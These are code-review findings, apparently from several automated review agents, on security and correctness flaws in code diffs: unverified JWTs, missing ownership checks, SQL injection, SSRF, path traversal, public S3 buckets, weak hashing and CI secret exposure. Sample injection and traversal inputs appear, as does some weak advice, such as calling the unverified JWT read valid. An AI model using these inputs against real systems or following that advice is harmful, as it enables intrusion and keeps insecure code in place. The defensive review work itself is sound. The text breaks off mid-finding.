`tenant_of` calls `jwt.decode(..., options={"verify_signature": False})`, so the returned `tenant_id` comes from a payload that nobody has authenticated. Anyone who can craft a base64 JSON blob can set `tenant_id` to any value and it will be returned as if it were a trusted claim. Since `claims_for` two lines above already performs a verified decode with `public_key()` and `algorithms=["RS256"]`, the fix is to derive the tenant from the verified claims: `return claims_for(token)["tenant_id"]`. If an unverified peek is genuinely needed (e.g. to pick a key before verification), the function should be named and documented to make that explicit and its result must never reach an authorization decision.

_Also raised by the security agent:_ tenant_id read from JWT with signature verification disabled

findings.title: Public function lacks documentation of security contract
findings.body:
The `tenant_of` function reads tenant_id from an unverified JWT token (signature verification explicitly disabled). This is a valid pattern for extracting non-sensitive routing information, but callers must understand that the returned tenant_id is not authenticated and could be forged. Without a docstring explaining this contract, callers may incorrectly treat the tenant_id as authenticated data or use it for authorization decisions.

Add a docstring documenting: (1) that the token signature is not verified, (2) what the tenant_id can and cannot safely be used for, and (3) why this design is appropriate.

findings.title: New tenant_of function has no test coverage
findings.body: tenant_of() is a new function that decodes a JWT without verifying its signature and returns the tenant_id claim. No test exists in this diff to confirm it returns the expected tenant_id for a valid token, handles a missing tenant_id claim, or behaves as intended for malformed tokens. Since this changes trust behavior (bypassing signature verification), at minimum a test asserting the returned value matches the embedded claim would catch accidental regressions (e.g., wrong claim key, accidental verification re-enabled, or exception behavior changes).

findings.title: Unguarded dict access raises KeyError for tokens without tenant_id
findings.body: `unverified["tenant_id"]` assumes the claim is present. Because the payload is not validated at all here, a token that simply omits `tenant_id` produces a raw `KeyError` rather than an auth-shaped failure, which callers are unlikely to be catching alongside `jwt` exceptions. Use `.get("tenant_id")` with an explicit check, or raise the module's own auth error.

findings.title: update_payment_method mutates object without ownership check
findings.body:
`pm_id` comes from the request path/args and flows directly into `PaymentMethod.get(pm_id)` on line 12, then the object is mutated on line 13 and persisted on line 14. No `require_owner(user, pm)` call sits between the fetch and the mutation, even though `current_user(request)` is resolved into `user` on line 11 and then never used — the check looks forgotten rather than deliberately omitted. The read handler immediately above does call `require_owner` on line 6, and `api/auth.py` documents that "Every object mutation must call this."

Any authenticated user can enumerate or guess `pm_id` values and overwrite the `billing_name` of payment methods belonging to other accounts. Add `require_owner(user, pm)` immediately after line 12, before any attribute assignment.

Secondary note while you are in here: `body["billing_name"]` on line 13 will raise `KeyError` on a request that omits the field, which typically surfaces as a 500; prefer explicit validation.

_Also raised by the correctness agent:_ update_payment_method mutates object without require_owner check

_Also raised by the correctness agent:_ Unvalidated body["billing_name"] raises KeyError on malformed request

findings.title: No test would catch missing authorization on update_payment_method
findings.body: update_payment_method fetches user and pm but never calls require_owner before mutating and saving, unlike the sibling read endpoint above it which does call require_owner. There is no test in this diff, so nothing would fail if a user could update another user's payment method's billing_name. Add a test that asserts a non-owner request raises Forbidden and that pm.billing_name is unchanged.

findings.title: Public mutation endpoint undocumented and potentially unprotected
findings.body: The function `update_payment_method` is a new public API endpoint that mutates a payment method resource, but it has no docstring explaining what it does, what parameters it accepts, or what authorization it enforces. More critically, the implementation on lines 11-14 calls `current_user()` and retrieves the payment method, but does not call `require_owner()` to authorize the mutation — unlike the `get_payment_method()` function on line 6, which explicitly enforces ownership. A caller reading the signature would have no way to know whether they can update any payment method or only their own, creating a contract that is silent where it must be explicit.

findings.title: Result of PaymentMethod.get is used without a None check
findings.body: If `PaymentMethod.get(pm_id)` returns `None` for an unknown id, line 13 raises `AttributeError` instead of a not-found response. I do not have `PaymentMethod.get`'s implementation, so it may raise on miss instead; if it returns `None`, add an explicit not-found branch after line 12.

findings.title: Rate limit removed from password reset endpoint
findings.body:
The `@rate_limit("5/hour")` decorator (and the `from limits import rate_limit` import) were deleted from `request_reset`, which now calls `send_reset_email(email)` unconditionally on every request. The entry point is the `email` parameter of the `request_reset` handler; the sink is `send_reset_email` on line 2. With no throttle, an unauthenticated caller can:

- flood any victim address with reset mail (mail-bombing / using your domain as a spam relay),
- burn outbound mail quota and reputation,
- and, if the response or timing differs for unknown addresses, enumerate registered accounts at high speed.

If the limiter genuinely needs to move (e.g. to middleware or a gateway), the replacement control should be visible or referenced; nothing in this diff supplies one. Otherwise restore the decorator, and consider keying the limit on both source IP and target email so neither axis can be abused alone.

findings.title: Password reset endpoint loses its only throttle with no replacement
findings.body: `request_reset` previously ran under `@rate_limit("5/hour")`; the decorator and its import are deleted and nothing in the diff replaces them. The body still calls `send_reset_email(email)` unconditionally and returns `{"sent": True}` for every call, so the function now has no upper bound on how often it will dispatch mail for a given address or caller. Practical consequences: unbounded outbound email per address (mailbox flooding, sender-reputation damage) and an unmetered oracle for whoever is probing addresses. If the throttle genuinely moved elsewhere (gateway, middleware, inside `send_reset_email`), say so in the PR description and point at it; otherwise restore the decorator or add an equivalent per-email/per-IP limit before this merges.

findings.title: No test guards against removal of rate limiting on password reset
findings.body: The `request_reset` endpoint had its `@rate_limit("5/hour")` decorator removed. Nothing in this diff shows a test that asserts the endpoint is rate-limited (e.g. calling it repeatedly and expecting a 429/throttled response after N calls). If such a test existed and were passing before, it should now fail after this change; since no test file is included, it's unclear whether coverage exists at all — if it doesn't, this behavior change is unguarded.

findings.title: read_export_preview bypasses _confined(), allowing reads outside EXPORT_ROOT
findings.body:
The existing reader resolves the caller-supplied `name` through `_confined(name)` (line 14) before opening it; the new `read_export_preview` instead does a raw `os.path.join(EXPORT_ROOT, name)`. `os.path.join` does not constrain the result: a `name` containing `../` walks above `EXPORT_ROOT`, and an absolute `name` (e.g. `/etc/passwd`) discards `EXPORT_ROOT` entirely, so the join returns that absolute path verbatim. Any content reachable by the process can then be returned to the caller, truncated to `limit` bytes.

Route the path through the same helper: `path = _confined(name)` before `open(path, "rb")`, so both entry points share one invariant.

_Also raised by the security agent:_ read_export_preview skips _confined(), enabling path traversal

findings.title: Public function missing security contract documentation
findings.body: The `read_export_preview` function is a new public API that handles file paths. Without a docstring, callers cannot understand its security guarantees. Critically, this function does not call `_confined(name)` as the similar `read_export` function does above it (line 14), making it vulnerable to path traversal attacks if `name` is not pre-validated. A caller reading the function name and signature would reasonably assume it is safe to use with user-supplied input, but it is not. The function must either be documented as requiring pre-validated input, or the implementation must be corrected to use `_confined(name)` and documented accordingly.

findings.title: New unconfined path-join function has no test coverage
findings.body: read_export_preview builds its path with os.path.join(EXPORT_ROOT, name) directly, unlike the existing function above which calls _confined(name). No test exists in this diff (or apparently in the repo) that would exercise this new function with a traversal-style name (e.g. '../../etc/passwd') and assert that access is denied or confined. If this behavior is wrong — i.e., if it should have used _confined() — nothing here would fail.

findings.title: Ownership check removed from bulk_export enables cross-tenant read
findings.body:
`bulk_export` previously called `require_owner(user, report)` for every fetched report; that loop and the `require_owner` import were deleted in this change. The function now takes caller-supplied `report_ids`, calls `Report.get(rid)` for each, and serialises every result with `to_dict()` — with no check that the reports belong to `current_user(request)`'s tenant.

Entry point: the `report_ids` parameter of `bulk_export`, populated from the request (the exact request-parsing wrapper is not in the diff or the retrieved context). Sink: `Report.get(rid)` followed by `r.to_dict()` returned to the caller. Any authenticated user who can guess or enumerate IDs reads another tenant's data verbatim.

The retrieved `api/auth.py` docstring states explicitly: "Every object read or mutation of another tenant's data must go through this." If the goal is performance, keep the authorisation but make it cheap — e.g. fetch with a tenant-scoped query (`Report.get_many(report_ids, tenant_id=user.tenant_id)`) and reject or omit IDs that do not match, rather than dropping the check.

_Also raised by the correctness agent:_ bulk_export no longer enforces per-report ownership

_Also raised by the docs agent:_ Public API contract: bulk_export no longer validates ownership

findings.title: bulk_export cross-tenant access has no test that would fail
findings.body: The removal of the require_owner check means bulk_export now returns reports regardless of tenant ownership. There is no test in this diff (or evidenced in the repo context) that exercises bulk_export with reports belonging to a different tenant than the requesting user and asserts a Forbidden/error is raised or that the result excludes them. If such a test existed prior to this change, it should have failed here and been included in the diff; since no test file is part of this PR, this regression would go undetected by the test suite.

findings.title: `user` is now computed but unused
findings.body: After the ownership loop was removed, `user = current_user(request)` on line 5 has no remaining consumer. This is a useful signal that the authorisation check was dropped rather than replaced; if the intent is to keep authorisation, `user.tenant_id` should be threaded into the report lookup. If authorisation really is handled elsewhere, the dead binding should be removed so the next reader is not misled into thinking the handler is user-scoped.

findings.title: search_customers bypasses execute()'s parameter contract
findings.body:
`billing.db.execute(sql, params=None)` is documented as "Run a parameterised query. `params` must carry every caller value." `search_customers` instead formats `term` and `status` directly into the SQL text on line 9 and calls `execute(sql)` with no params on line 10, so no value ever reaches the driver's escaping path. The sibling function `get_customer` on line 5 shows the intended usage. Rewrite as:

```python
sql = "SELECT * FROM customers WHERE name LIKE %s AND status = %s"
return execute(sql, (f"%{term}%", status))
```

Note the wildcards belong in the *parameter value*, not the SQL string.

findings.title: SQL injection: f-string interpolation in search_customers
findings.body:
`search_customers` interpolates `term` and `status` directly into the SQL string and then calls `execute(sql)` with no params, so the values are parsed by the database as SQL rather than bound as data. A caller value such as `term = "' OR '1'='1"` or `status = "x' UNION SELECT ... --"` changes the query's meaning; with a multi-statement-capable driver it can also reach writes/DDL.

Fix by keeping the query static and passing values through the existing parameter channel, wrapping the LIKE wildcards in the parameter rather than the SQL:

```python
def search_customers(term, status):
    sql = "SELECT * FROM customers WHERE name LIKE %s AND status = %s"
    return execute(sql, (f"%{term}%", status))
```

This matches `get_customer` on line 5 and the documented contract of `execute`.

findings.title: Function violates documented `execute()` contract
findings.body: The `execute()` docstring states that 'params must carry every caller value', establishing an explicit contract that the function accepts parameterized queries with separate params. This function violates that contract by passing a raw f-string to `execute()` without params, which contradicts the documented interface and will mislead any caller familiar with that contract.

findings.title: No test exists for search_customers behavior
findings.body: search_customers is new, untested code that builds a SQL string via f-string interpolation of `term` and `status` rather than passing them as params to execute() (contrast with get_customer just above, which uses %s placeholders and a params tuple). Nothing in this diff would catch a regression here — e.g. if a caller passed a value containing a quote or `%` wildcard, or if someone changed the interpolation logic incorrectly. A test asserting the SQL string and params passed to execute() (or an integration test against a real/fake cursor) would catch both correctness regressions and confirm the query construction contract.

findings.title: verify_endpoint performs SSRF-able GET with no ALLOWED_HOSTS check
findings.body:
`verify_endpoint(url)` passes its argument straight to `requests.get` with no destination validation, while the existing send path immediately above it rejects any URL whose host is not in `ALLOWED_HOSTS` (lines 8-9). Given the PR is about letting customers register a webhook target, `url` is attacker-controlled, so this function can be used to make the server issue GETs to internal addresses — cloud metadata endpoints (169.254.169.254), localhost admin ports, RFC1918 services — and the returned status code is a usable oracle for internal port/host scanning.

Apply the same host allowlist here before the request, e.g. factor the parse+`ALLOWED_HOSTS` check out of the sender into a shared validator and call it from both. Also consider `allow_redirects=False`, since an allowlisted host can otherwise redirect the client to an internal target.

findings.title: verify_endpoint skips the ALLOWED_HOSTS guard used by the sibling sender
findings.body:
The existing send path on lines 8-10 refuses to talk to any host outside `ALLOWED_HOSTS` before issuing the request. `verify_endpoint` takes the same kind of customer-supplied URL and issues a GET with no equivalent check, so a URL that the module deliberately refuses to POST to will still be fetched here. Since `requests.get` also follows redirects by default, even an allowlisted host could hand the request onward to an arbitrary destination. Route the URL through the same host extraction and `ALLOWED_HOSTS` check before the call (and consider `allow_redirects=False`), so both entry points agree on what destinations are reachable.

Secondary: the function's declared result is a status code, but a timeout or DNS failure raises out of it instead, so callers written against an int return need their own try/except.

findings.title: New verify_endpoint has no test coverage
findings.body: verify_endpoint is a new public function that performs an unvalidated GET request and returns a status code, but no test exercises it. Notably it bypasses the ALLOWED_HOSTS check used elsewhere in the file (lines 8-9), which a test would likely have caught as a behavioral difference from send-like functions. Without a test, a regression (e.g. wrong return value, exception handling, or host validation being added/removed) would go unnoticed.

findings.title: Public function `verify_endpoint` has no docstring
findings.body: The function `verify_endpoint` is defined at module level without a docstring. Callers need to know: what does it return (HTTP status code, not a boolean of success), what happens on network failure or timeout, and whether the function has side effects. The bare name `verify_endpoint` could reasonably be interpreted as returning a boolean, when it actually returns an integer.

findings.title: Public access block fully disabled on customer invoices bucket
findings.body:
`aws_s3_bucket.invoices` ("acme-customer-invoices") is created with an `aws_s3_bucket_public_access_block` where all four guards are set to `false`. With `block_public_acls`/`ignore_public_acls` off, any principal that can call `PutObjectAcl`/`PutBucketAcl` (including an over-broad CI or application role) can make invoice objects world-readable, and with `block_public_policy`/`restrict_public_buckets` off a `Principal: "*"` bucket policy will be accepted and honoured. This is the account-level safety net for exactly the accidental-exposure class of incident, and it is being switched off on a bucket whose name says it holds customer billing data.

Unless there is a concrete requirement for anonymous reads of invoices, set all four fields to `true` (or simply omit the resource and rely on S3's secure-by-default block). If some subset of objects genuinely must be public, serve them through CloudFront with an origin access control instead of opening the bucket. Given the data class, also consider adding `aws_s3_bucket_server_side_encryption_configuration` and versioning for this bucket.

Separately, note that the pre-existing `assets` block (lines 7-10, shown as context) has the same four flags disabled; if that bucket is only serving static assets it is a lesser concern, but it is worth confirming it is intentional while this file is open.

_Also raised by the correctness agent:_ Invoices bucket disables all four public-access guardrails

findings.title: PR titled "public assets bucket" introduces an unrelated invoices bucket
findings.body: The PR is described as adding the public assets bucket, but the only new resources are `aws_s3_bucket.invoices` and its public-access block; the assets resources were merely reformatted. Either the invoices bucket was added by mistake (wrong file/branch, copy-paste of the assets block) or the PR description is wrong. Given the settings it carries, this mismatch is worth resolving before merge rather than after — an unreviewed-by-intent resource is exactly how a permissive default reaches production.

findings.title: verify_acmepay compares HMAC with == instead of compare_digest
findings.body:
`verify_acmepay` computes the same HMAC-SHA256 hexdigest as `verify_stripe` but returns `expected == header`. Python's `==` on str short-circuits at the first differing byte, so the comparison time leaks a prefix-match length and an attacker who can replay requests can recover a valid signature byte by byte without knowing the secret. The function immediately above already does this correctly. Change line 12 to `return hmac.compare_digest(expected, header)` to match. Note `compare_digest` raises `TypeError` on a non-str/bytes `header`, so if callers may pass `None` guard for that explicitly rather than relying on `==` returning `False`.

_Also raised by the security agent:_ Webhook HMAC compared with `==` instead of hmac.compare_digest

findings.title: Public function contract undocumented: unsafe comparison choice
findings.body: The `verify_acmepay` function uses `==` for timing-sensitive comparison (line 12) while the adjacent `verify_stripe` function uses `hmac.compare_digest`. A caller reviewing both functions would reasonably assume they are equally safe, since both are public and their names do not indicate a difference in security properties. If this is intentional (e.g., because the AcmePay API itself is vulnerable to timing attacks and this matches their requirement), that choice must be documented in the function's docstring. If it is unintentional, it is a defect in the implementation itself — but either way, the contract is not documented.

findings.title: New verify_acmepay function added without any test coverage
findings.body: The new verify_acmepay function is added with no test file in this diff. If it contains a bug (e.g. wrong comparison logic, wrong hash construction), nothing in the current change set would catch it. This is a behavior-change/new-code finding, not a security finding about the comparison itself.

findings.title: Exception text and traceback returned in HTTP 500 response body
findings.body:
`handle()` previously returned a fixed `{"error": "internal error"}` payload; it now serialises `str(exc)` and `traceback.format_exc()` into the response. Any client that can provoke an unhandled exception (malformed input, an unreachable dependency, a bad ID) receives absolute source file paths, module and function names, line numbers, local framework/library versions, and whatever the exception message contains — which for DB, HTTP-client or auth libraries routinely includes connection strings, query fragments, hostnames or token prefixes. That is a free map of the internals for anyone probing the service, and it is returned unconditionally rather than gated on a debug flag.

Keep the client-facing payload opaque and put the detail where it already goes — the log on line 8, which already calls `log.exception`. If the detail is needed for support, emit a correlation id: `log.exception("request failed", extra={"rid": rid}); return {"error": "internal error", "request_id": rid}, 500`. If verbose output is genuinely wanted for local work, guard it behind an explicit development-only setting that defaults to off.

_Also raised by the correctness agent:_ traceback.format_exc() is wrong unless handle() runs inside an except block

_Also raised by the correctness agent:_ Error response body changed shape and value; callers may assume the old one

findings.title: No test verifies error response now leaks exception/traceback
findings.body: handle() now returns str(exc) and a full traceback in the response body instead of a generic message. No test file is included in this diff, so there is nothing that would fail if this behavior were reverted or further modified incorrectly. Given this is a change to what data is exposed to callers, at least one test asserting the shape/content of the returned tuple would catch accidental regressions.

findings.title: Reset path stores passwords as unsalted MD5 instead of bcrypt
findings.body:
`hash_reset_password` hashes the password with a single round of unsalted MD5, while `hash_password` in the same file uses `bcrypt.hashpw` with a generated salt. Any password set via the reset flow is therefore stored in a form that is recoverable at billions of guesses per second on commodity GPUs, and that is identical across users for identical passwords (no salt), enabling rainbow-table and cross-account correlation attacks against a leaked user table. It also means the verification path must branch on hash format, which is itself a downgrade vector.

Use the existing bcrypt helper for the reset path — `return hash_password(raw)` — and drop the `hashlib` import if `checksum` is later moved. If some callers already persisted MD5 values, plan a rehash-on-next-login migration rather than keeping the weak branch.

findings.title: hash_reset_password returns a hash format bcrypt cannot verify
findings.body: `hash_password` returns a bcrypt modular-crypt string (`$2b$...`) while the new `hash_reset_password` returns a bare 32-char MD5 hex digest. Both evidently feed the same stored password field, but the two formats are not interchangeable: `bcrypt.checkpw(raw, stored)` against an MD5 digest raises `ValueError: invalid salt` (or returns False, depending on version) rather than validating. Any account whose password was last set through the reset path will therefore fail login — or, if the verifier branches on format, will be checked with an unsalted single-round digest. Have the reset path call `hash_password` so one format and one verifier are used everywhere; if a separate reset artefact is genuinely intended, it should be a distinct, non-password-column token with its own verification function.

findings.title: New hash_reset_password function has no accompanying test
findings.body: hash_reset_password is new behavior (password reset hashing) with no test exercising it in this diff. If its implementation were changed or broken (e.g., wrong encoding, wrong algorithm choice, or exception on certain inputs), nothing would catch it. Add a test asserting the function returns a deterministic hex digest for known input.

findings.title: pull_request_target checks out and runs untrusted fork code with NPM_TOKEN
findings.body:
`pull_request_target` runs in the context of the base repository: it has access to repository secrets and the `GITHUB_TOKEN` carries write permissions, unlike `pull_request` on a fork. This change combines that with `ref: ${{ github.event.pull_request.head.sha }}`, which checks out the attacker's branch contents, and then executes `./scripts/measure.sh` from that checkout with `NPM_TOKEN` injected into the environment.

Any user can fork the repo, edit `scripts/measure.sh` (or any file it sources, plus `package.json` lifecycle scripts, config files, or a lockfile pointing at a malicious package if the script installs dependencies), open a pull request, and have that code run on a runner holding `NPM_TOKEN` and a write-scoped `GITHUB_TOKEN`. The PR does not need to be approved or merged. Exfiltration is a single `curl` away, and secrets masking in logs does not prevent it.

Safe options, in order of preference:
1. Revert to `pull_request`. If the only reason for the change was that forked PRs got no token, reconsider whether the size check needs `NPM_TOKEN` at all — a read-only measure step usually does not.
2. If a private registry really is required, split into two workflows: an untrusted `pull_request` job that builds/measures with no secrets and uploads an artifact, and a trusted `workflow_run` job that consumes the artifact and posts results.
3. If `pull_request_target` must stay, do **not** check out `head.sha`. Run only base-repo code, and set `permissions:` to the minimum (`contents: read`) rather than relying on the default write token.

_Also raised by the correctness agent:_ pull_request_target + head.sha checkout runs fork code with NPM_TOKEN

findings.title: Stated goal already held under `pull_request`; trigger swap is not the fix
findings.body: The change is titled "run the size check on forked pull requests", but `pull_request` already fires for pull requests opened from forks — the job was running, just without access to `secrets.NPM_TOKEN` and with a read-only `GITHUB_TOKEN`. So the real symptom being chased is almost certainly a missing-token failure in `scripts/measure.sh`, and `pull_request_target` "fixes" it only by handing that token to untrusted code. Worth confirming what actually failed before landing, because the correct fix (make the measurement work without the token, or move the token-requiring step out of the untrusted checkout) is different from the one implemented here.

findings.title: json.dumps narrows accepted contexts; previously-working calls now raise TypeError
findings.body:
The old key was `(template_source, tuple(sorted(context.items())))`, which only required context keys/values to be hashable and orderable. The new key requires every value to be JSON-serialisable. Common context values that are hashable but not JSON-serialisable — `datetime`, `Decimal`, `UUID`, `frozenset`, enum members, arbitrary model objects — now raise `TypeError: Object of type X is not JSON serializable` from line 9, before any render is attempted. That turns a working call into an exception with no fallback.

If contexts can hold non-primitive values, either pass `default=repr`/`default=str` to `json.dumps`, or catch `TypeError` and fall back to rendering uncached. Note the reverse also changed: contexts containing lists/dicts used to raise (unhashable) and now succeed, so the two failure sets are not the same and existing callers cannot be assumed unaffected.

findings.title: MD5 digest used as render-cache key invites collision-based cache poisoning
findings.body:
`cached_render` now collapses the exact key `(template_source, sorted(context))` into a 128-bit MD5 digest and uses only that digest for lookup and storage (lines 9–13). Unlike the previous tuple key, the digest is not compared against the original inputs, so any two payloads that share a digest share a cache entry: the first caller's rendered output is returned to the second.

MD5 chosen-prefix collisions are practical on commodity hardware. If `template_source` or `context` carries any attacker-influenced bytes — a user-supplied template fragment, a tenant id, a request parameter folded into the context — an attacker can register an entry under a digest that a victim request will later hit, causing a wrong or cross-tenant render to be served from cache.

Fix: use `hashlib.sha256(payload.encode()).hexdigest()`, or keep the digest but store `(payload, result)` and verify the stored payload matches before returning the cached value. A secondary benefit: `hashlib.md5()` without `usedforsecurity=False` raises on FIPS-enabled builds, so this line can also fail outright in hardened deployments.

findings.title: New ValueError and narrow name charset break existing callers
findings.body:
`create_archive` previously accepted any `name` and only ever raised `CalledProcessError`. It now raises `ValueError` for anything outside `[A-Za-z0-9_-]{1,64}`, which rejects names callers plausibly already pass: dots (`backup.2024-01-01`, `site.example.com`), spaces, and anything longer than 64 characters. Callers that do not catch `ValueError` will now fail at a new point with a new exception type.

Either widen the pattern to cover the names actually in use (dots at minimum, while still excluding `/` and `..`), or confirm every call site and document the new exception in the docstring. No caller code was retrieved, so this needs a human to check the call sites.

findings.title: Command argument list is never asserted, only the shell flag
findings.body: test_runs_without_a_shell only checks `spy.last_call.kwargs["shell"] is False`; it never inspects the positional args list passed to subprocess.run. If a future edit dropped the `--` separator, reordered args, or substituted the wrong value for `name`/`directory` (while still calling with shell=False), this test would still pass. Consider also asserting on `spy.last_call.args` (or equivalent) to pin down the exact command list.

findings.title: `directory` reaches tar unvalidated while `name` is allowlisted
findings.body: `name` is constrained by `SAFE_NAME.fullmatch`, but `directory` flows straight into the tar argv on line 12. The `--` separator and `shell=False` correctly prevent option-injection and shell metacharacter injection, so this is not a command-injection issue. What remains is scope: if `directory` is caller- or request-supplied, a value like `/etc` or `/home/other-tenant` causes tar to read and package files outside the intended export root, and the resulting archive lands in the predictable, readable path `/exports/<name>.tar.gz`. If callers already constrain `directory` to a trusted root, ignore this; otherwise consider resolving it with `os.path.realpath` and asserting it is contained within the allowed base directory, mirroring the validation already applied to `name`.

findings.title: directory is now a single argv element; shell word-splitting is gone
findings.body:
Under `shell=True` the old command interpolated `directory` into a string, so the shell word-split and glob-expanded it: a caller passing `"/srv/a /srv/b"` or `"/srv/data/*"` archived multiple paths. With the list form, the whole string becomes one argv element and tar will fail with "no such file or directory" for those callers.

If multi-path or glob input is a supported usage, change the parameter to accept a sequence and splat it into the argv list (`["tar", "-czf", dest, "--", *directories]`); otherwise confirm no caller relies on it.

findings.title: Test asserts only shell=False, not that argv is a list
findings.body: `test_runs_without_a_shell` checks `kwargs["shell"] is False` but never inspects the positional argv. A regression that reverts to `subprocess.run(f"tar -czf ...", shell=False)` — a single string, which on POSIX is treated as a bare program name and fails, and on Windows re-introduces the old parsing — would still pass this test. Assert on the argv list too, e.g. that the first positional equals `["tar", "-czf", "/exports/nightly.tar.gz", "--", "/srv/data"]`, which also pins the `--` separator that the fix depends on.

findings.title: test_renders_empty_invoice asserts nothing
findings.body:
`test_renders_empty_invoice` calls `render(Invoice(lines=[]))` and discards the result without any assertion. It passes for any return value \u2014 `None`, `""`, a stray header, or a wrongly formatted zero total \u2014 and only fails if `render` raises. If the intent is "empty invoices do not crash", state that explicitly; better, assert on the expected output, e.g. `assert render(Invoice(lines=[])) == ""` or that the rendered string contains the zero total. As written this test consumes CI time while protecting nothing, and it will keep passing through a regression in the empty-invoice path.

_Also raised by the tests agent:_ test_renders_empty_invoice has no assertion

findings.title: Test only checks mock call_count, not rendered output
findings.body:
